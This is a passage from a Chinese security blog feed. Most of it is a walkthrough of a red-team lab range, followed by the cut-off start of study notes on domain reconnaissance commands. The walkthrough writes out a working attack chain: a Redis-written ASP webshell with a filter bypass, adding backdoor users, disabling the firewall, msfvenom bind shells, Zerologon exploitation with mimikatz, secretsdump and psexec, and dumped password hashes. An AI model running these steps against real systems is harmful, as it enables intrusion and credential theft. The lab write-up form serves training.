        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1367358886&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/XcCJfM.jpg"><br>本次靶场要求：<br>提示： <a href="http://www.cocat.cc/web.zip">http://www.cocat.cc/web.zip</a><br>四个 <code>root.txt</code> 分别在四台机子用户目录下 <code>拿到三个及格</code> <code>拿下四个满分</code></p><h2 id="代码审计-Getshell"><a href="#代码审计-Getshell" class="headerlink" title="代码审计 Getshell"></a>代码审计 Getshell</h2><p>首先是一个站：cocat.cc<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Q85dTv.jpg"><br>通过提示把它的备份文件下载到了本地进行审计：<a href="http://www.cocat.cc/web.zip">http://www.cocat.cc/web.zip</a><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/7ucmM0.jpg"></p><h2 id="Bypass-突破执行命令"><a href="#Bypass-突破执行命令" class="headerlink" title="Bypass 突破执行命令"></a>Bypass 突破执行命令</h2><p>通过审计拿到了一个 webshell：<a href="http://www.cocat.cc/kss_tool/_webup.php">http://www.cocat.cc/kss_tool/_webup.php</a><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/AQWnLh.jpg"><br>由于当前环境不能执行命令，函数都写死了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/x4nSCi.jpg"><br>通过翻文件翻到了 <code>Mysql</code> 的配置文件：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/dqgLUW.jpg"><br>本想尝试 <code>Mysql udf</code> 提权绕过发现 <code>Mysql</code> 版本大于 <code>5.1</code> ：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/3zeFtD.jpg"></p><h3 id="拿到宝塔后台权限"><a href="#拿到宝塔后台权限" class="headerlink" title="拿到宝塔后台权限"></a>拿到宝塔后台权限</h3><p>由于当前 <code>web</code> 是宝塔搭建的:<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/wubTCy.jpg"><br>通过翻文件找到了宝塔后台地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/BtSoft/panel/data/admin_path.pl</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CdkKrH.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Y0sh7p.jpg"><br>然后通过把宝塔的 <code>default.db</code> 文件下载到本地打开，<code>users</code> 表里就是宝塔的登陆账号密码：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ktnP65.jpg"><br><code>md5</code> 是肯定解密不出来的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CImb4L.jpg"><br>这个时候需要替换 <code>md5</code> 或者添加一个用户：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/74ktDN.jpg"><br>然后把文件保存，上传到目标宝塔目录下：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/PcMi5c.jpg"><br>这个时候使用账号 <code>saulGoodmang</code> 密码 <code>123456</code> 去登陆：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/vAuUxu.jpg"><br>手动把禁用的函数关闭：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/dZH8bO.jpg"><br>然后给他来个重启：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/n41yfZ.jpg"><br>命令执行强行绕过：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/02f1Cm.jpg"></p><h3 id="拿到第一个-root-txt"><a href="#拿到第一个-root-txt" class="headerlink" title="拿到第一个 root.txt"></a>拿到第一个 root.txt</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;moonsec-c20ad4d76fe97759aa27a0c99bff6710-1&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/l4PGJh.jpg"></p><h2 id="内网渗透一"><a href="#内网渗透一" class="headerlink" title="内网渗透一"></a>内网渗透一</h2><p>通过查看进程发现有<code>火绒AV</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4UaLas.jpg"><br>随即做免杀上线到 <code>CS</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/xvj65T.jpg"><br>发现当前内网应该是有其他主机存活的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/eZrnGH.jpg"><br>通过 <code>nbtscan</code> 发现内网还有一台主机存活：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/KWP6wi.jpg"><br>通过 <code>fscan</code> 也扫描出来内网资产了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/W3dyzX.jpg"><br>为了进内网直接做了一个 <code>frp socks</code> 代理进去：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/85FRm8.jpg"><br>通过 <code>lengyi</code> 老哥的脚本绕过火绒添加了一个用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker 密码：P@ssw0rd</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ELFKe3.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/8vtTjI.jpg"><br>然后开启了它的 <code>3389</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/woto8N.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Fg29dd.jpg"><br>为了方便我把 <code>shell</code> 弹到了<code>msf</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/djqpOn.jpg"><br>然后抓到了 <code>hash</code>：（由于是 windows 2012 明文是抓不了的，只能抓 hash）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:de935c6087ec367d3ef786915a4edcce:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">hacker:1003:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::</span><br><span class="line">mysql:1002:aad3b435b51404eeaad3b435b51404ee:291376866817cf2ccfe198308e5f925b:::</span><br><span class="line">www.saulgoodman.cn:1001:aad3b435b51404eeaad3b435b51404ee:894f353e870620b186a9a46ce56ac8f1:::</span><br></pre></td></tr></table></figure><p>通过解密得到了 <code>administrator</code> 的密码：<code>QWEasd444</code></p><h3 id="内网横向移动-192-168-59-4"><a href="#内网横向移动-192-168-59-4" class="headerlink" title="内网横向移动-192.168.59.4"></a>内网横向移动-192.168.59.4</h3><p>通过 <code>msf</code> 对内网进行扫描 <code>arp</code> 存活发现了几台机器：（之前没扫描出来应该是有防火墙）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post/windows/gather/arp_scanner</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/QS9PWe.jpg"><br><code>192.168.59.1</code> 就不用看了是网关，<code>192.168.59.4</code> 就是内网另一台主机！<br>随后 <code>proxychains</code> + <code>nmap</code> 对 <code>192.168.59.4</code> 进行扫描探测端口服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -sV -Pn -n -p22,80,139,135,445,3306,1433,6379  192.168.59.4</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/FfkbkQ.jpg"><br>发现开放的端口有：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/1Y7Hgu.jpg"><br><code>web</code> 页面的话倒是没啥：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/smDzai.jpg"><br>看了看扫描出来 <code>6379</code> 应该是 <code>redis</code> 相关漏洞！<br>通过尝试 <code>redis</code> 未授权发现连接成功！<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/jWj5Df.jpg"><br>但是查看信息发现出错，应该是密码问题：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4ORUe5.jpg"><br>通过 <code>msf redis</code> 爆破模块爆破出了密码：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/3UPmy7.jpg"><br>重新登陆 <code>redis</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains redis-cli -h 192.168.59.4 -p 6379 -a 123456789qq</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/MC9rF5.jpg"><br>登陆成功！现在要想拿到权限首先我们不知道网站路径（写不了一句话 ），但是知道当前网站使用的是 <code>IIS</code>，那么 <code>IIS</code> 默认目录是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Inetpub\wwwroot</span><br></pre></td></tr></table></figure><p>设想会不会是这个目录呢？随即写了一个 <code>aspx</code> 的 <code>shell</code> 到 <code>IIS</code> 默认目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">192.168.59.4:6379&gt; config set dir C:/inetpub/wwwroot/</span><br><span class="line">OK</span><br><span class="line">192.168.59.4:6379&gt; config set dbfilename 1.aspx</span><br><span class="line">OK</span><br><span class="line">192.168.59.4:6379&gt; set x &#x27;&lt;%execute(request(&quot;x&quot;))%&gt;&#x27;  //注意这里要用单引号</span><br><span class="line">OK</span><br><span class="line">192.168.59.4:6379&gt; save</span><br></pre></td></tr></table></figure><p>发现写入不了，随后设置了读写权限 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> slave-read-only on </span><br></pre></td></tr></table></figure><p>然后发现读写可以了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/TUmZnl.jpg"><br>再来写一遍 <code>webshell</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/54B8fs.jpg"><br>发现是 <code>404</code>，写 <code>asp</code> 是 <code>500</code>，应该是什么东西拦截了。</p><p>随后 <code>bypass</code> 测试，可以通过这样绕过：（单引号中间要带空格）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set x &#x27;    &lt;%execute(request(&quot;x&quot;))%&gt;    &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/UnHe9h.jpg"><br>拿到 webshell：<a href="http://192.168.59.4/a.asp">http://192.168.59.4/a.asp</a> </p><h2 id="内网渗透二"><a href="#内网渗透二" class="headerlink" title="内网渗透二"></a>内网渗透二</h2><p>通过发现当前机器是不出网的，而且权限还很小：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/gVDNVZ.jpg"><br>发现当前机器上权限太小任何文件都上传不了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/fDTOcr.jpg"><br>通过找到了一个可读可写目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\VMware\logs\</span><br></pre></td></tr></table></figure><p>并且当前机器上无任何杀软：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/lq7GNB.jpg"><br>随即坏土豆提权成功：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/kMKMZg.jpg"><br>拿到第二个 flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;moonsec-b6d767d2f8ed5d21a44b0e5886680cb9-2&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/HKW3g8.jpg"><br>随即添加了一个 <code>asp.net</code> 管理员用户进去：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/59R6UE.jpg"></p><h3 id="内网渗透-10-10-10-202"><a href="#内网渗透-10-10-10-202" class="headerlink" title="内网渗透-10.10.10.202"></a>内网渗透-10.10.10.202</h3><p>通过对内网进行存活探测发现内网存活了三台：<code>10.10.10.201</code>、<code>10.10.10.202</code>（本机）、<code>10.10.10.209</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l  %i  <span class="keyword">in</span> (1,1,255) <span class="keyword">do</span> @  ping  10.10.10.%i  -w  1  -n  1 |  find  /i  <span class="string">&quot;ttl=&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/iwqJRB.jpg"><br>随后关闭它防火墙：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Sy0gCC.jpg"><br>然后 <code>MSF</code> 生成<code>正向 shell</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9099 -f exe &gt;/root/9099.exe</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/t5IHA0.jpg"><br>目标运行 <code>9090.exe</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/42BMGT.jpg"><br>随后 <code>MSF</code> 上线：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/idgoPV.jpg"><br><code>hashdump</code> 解密得到了密码：<code>QWEasd1122</code>:<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/MxlBT8.jpg"><br>紧接着开了它的远程桌面：（之前添加了一个 <code>asp.net</code> 用户，方便后续好登陆桌面 ）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/PalAyt.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/NtwfJz.jpg"><br>通过 <code>nbtcan</code> 发现 <code>10.10.10.201</code>（DC）、<code>10.10.10.209</code> 是域环境：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2C0KDV.jpg"><br>得想办法拿到一台域机器<br>对他们进行扫描端口发现他们都开放了 <code>web</code> 服务：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/K117Za.jpg"><br>其中 <code>10.10.10.209</code> 还是一个 <code>Outlook Web App</code>（微软的邮件组件）<code>Exchange</code>  ：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/9pVZbV.jpg"><br>但是我们没有账号，这个时候我在 <code>Redis</code> 上找到了 <code>pts</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users&gt;<span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (*.pst) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (*.pst) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line">c:\Documents and Settings\Administrator\Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Documents and Settings\Administrator\Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br><span class="line">c:\Documents and Settings\Administrator\My Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Documents and Settings\Administrator\My Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br><span class="line">c:\Users\Administrator\Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Users\Administrator\Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br><span class="line">c:\Users\Administrator\My Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Users\Administrator\My Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/PvVtxj.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/brmbb0.jpg"><br>知道了两个用户邮箱：<code>moonsec@cncat.cc</code>、<code>test@cncat.cc</code><br>然后把文件都下载到本地，进行后续利用（发现都失败了）</p><h3 id="CVE-2020-1472-拿到域控"><a href="#CVE-2020-1472-拿到域控" class="headerlink" title="CVE-2020-1472 拿到域控"></a>CVE-2020-1472 拿到域控</h3><p>之后发现他域控存在 <code>CVE-2020-1472</code> 域内提权漏洞：（需要 20200918 之后的 mimikatz 才可以使用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::zerologon /target:10.10.10.201 /account:12SERVER-DC$</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/L1HPti.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:10.10.10.201 /account:12server-dc$ /exploit</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/bc1VGK.jpg"><br>导出所有域内用户凭证：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py cncat/12server-dc$@<span class="number">10.10</span><span class="number">.10</span><span class="number">.201</span> -no-<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">cncat.cc\Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/oJeHh4.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/IbR021.jpg"><br>拿到域控和 <code>flag</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2KQulH.jpg"><br>利用 <code>msf psexec</code> 上线：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                                                    Required  Description</span><br><span class="line">   ----                  ---------------                                                    --------  -----------</span><br><span class="line">   RHOSTS                10.10.10.201                                                       yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT                 445                                                                yes       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target <span class="keyword">for</span> pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                                                     no        The service display name</span><br><span class="line">   SERVICE_NAME                                                                             no        The service name</span><br><span class="line">   SHARE                                                                                    no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBDomain             cncat                                                              no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass               aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387  no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser               Administrator                                                      no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/bind_tcp_rc4):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   EXITFUNC     thread           yes       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LPORT        4446             yes       The listen port</span><br><span class="line">   RC4PASSWORD  msf              yes       Password to derive RC4 key from</span><br><span class="line">   RHOST        10.10.10.201     no        The target address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.201:445 - Connecting to the server...</span><br><span class="line">NOTE: Rex::Socket.gethostbyname is deprecated, use getaddress, resolve_nbo, or similar instead. It will be removed <span class="keyword">in</span> the next Major version</span><br><span class="line">[*] 10.10.10.201:445 - Authenticating to 10.10.10.201:445|cncat as user <span class="string">&#x27;Administrator&#x27;</span>...</span><br><span class="line">[*] 10.10.10.201:445 - Selecting PowerShell target</span><br><span class="line">[*] 10.10.10.201:445 - Executing the payload...</span><br><span class="line">[+] 10.10.10.201:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Started <span class="built_in">bind</span> TCP handler against 10.10.10.201:4446</span><br><span class="line">NOTE: Rex::Socket.gethostbyname is deprecated, use getaddress, resolve_nbo, or similar instead. It will be removed <span class="keyword">in</span> the next Major version</span><br><span class="line">[*] Sending stage (200266 bytes) to 10.10.10.201</span><br><span class="line">[*] Meterpreter session 5 opened (0.0.0.0:0 -&gt; 180.215.199.206:22222) at 2021-06-02 06:35:22 +0000</span><br><span class="line"></span><br><span class="line">meterpreter &gt;                                                                                    </span><br></pre></td></tr></table></figure><p>然后通过令牌窃取身份切换为域管：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/3jm7e1.jpg"><br>然后通过和域机器 <code>10.10.10.209</code> 建立 <code>IPC</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/AUKzNo.jpg"><br>至此最后一个 <code>flag</code> 也拿到：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4p4HUP.jpg"><br>至此本次考核完毕！</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>对于红队成员来说最重要的就是渗透不能有短板，各种漏洞都应该去复现一遍，由于我 <code>Exchange</code> 的漏洞未复现导致卡了很长时间，最后还是使用暴力的手段拿到域控，在真实环境中很危险，很有可能导致域控的密码恢复不了！哦豁，那你就等着跑路吧！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> redTeam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redTeam </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《内网安全攻防》学习笔记，第二章-域内信息收集</title>
      <link href="/2020/06/29/ad-information-search/"/>
      <url>/2020/06/29/ad-information-search/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1387951739&auto=1&height=66"></iframe><h2 id="2-1-内网信息搜集概述"><a href="#2-1-内网信息搜集概述" class="headerlink" title="2.1 内网信息搜集概述"></a>2.1 内网信息搜集概述</h2><p>当渗透测试人员进入内网后，面对的是一片“黑暗森林”，所以渗透测试人员首先会对当前所处的网络环境进行判断，通常的判断分为三种。</p><ul><li>我是谁？——对机器角色的判断。</li><li>这是哪？——对目前机器所处网络环境的拓扑结构进行分析和判断。</li><li>我在哪？——对目前机器所处位置区域的判断。</li></ul><h2 id="2-2-搜集本机信息"><a href="#2-2-搜集本机信息" class="headerlink" title="2.2 搜集本机信息"></a>2.2 搜集本机信息</h2><h3 id="1：查询网络配置信息"><a href="#1：查询网络配置信息" class="headerlink" title="1：查询网络配置信息"></a>1：查询网络配置信息</h3><p>获取本机网络配置信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1607.png" alt="图片"></p><h3 id="2：查询操作系统及软件的信息"><a href="#2：查询操作系统及软件的信息" class="headerlink" title="2：查询操作系统及软件的信息"></a>2：查询操作系统及软件的信息</h3><h4 id="（1）查询操作系统和版本信息"><a href="#（1）查询操作系统和版本信息" class="headerlink" title="（1）查询操作系统和版本信息"></a>（1）查询操作系统和版本信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">英文版系统用这条命令：</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Nmae&quot; /C:&quot;OS Version&quot;</span><br><span class="line"></span><br><span class="line">中文版系统用这条命令：</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><h4 id="（2）查看系统体系结构"><a href="#（2）查看系统体系结构" class="headerlink" title="（2）查看系统体系结构"></a>（2）查看系统体系结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1608.png" alt="图片"></p><h4 id="（3）查看安装的软件及版本、路径等"><a href="#（3）查看安装的软件及版本、路径等" class="headerlink" title="（3）查看安装的软件及版本、路径等"></a>（3）查看安装的软件及版本、路径等</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1609.png" alt="图片"></p><h4 id="（4）使用powershell命令，搜集软件的版本信息"><a href="#（4）使用powershell命令，搜集软件的版本信息" class="headerlink" title="（4）使用powershell命令，搜集软件的版本信息"></a>（4）使用powershell命令，搜集软件的版本信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property 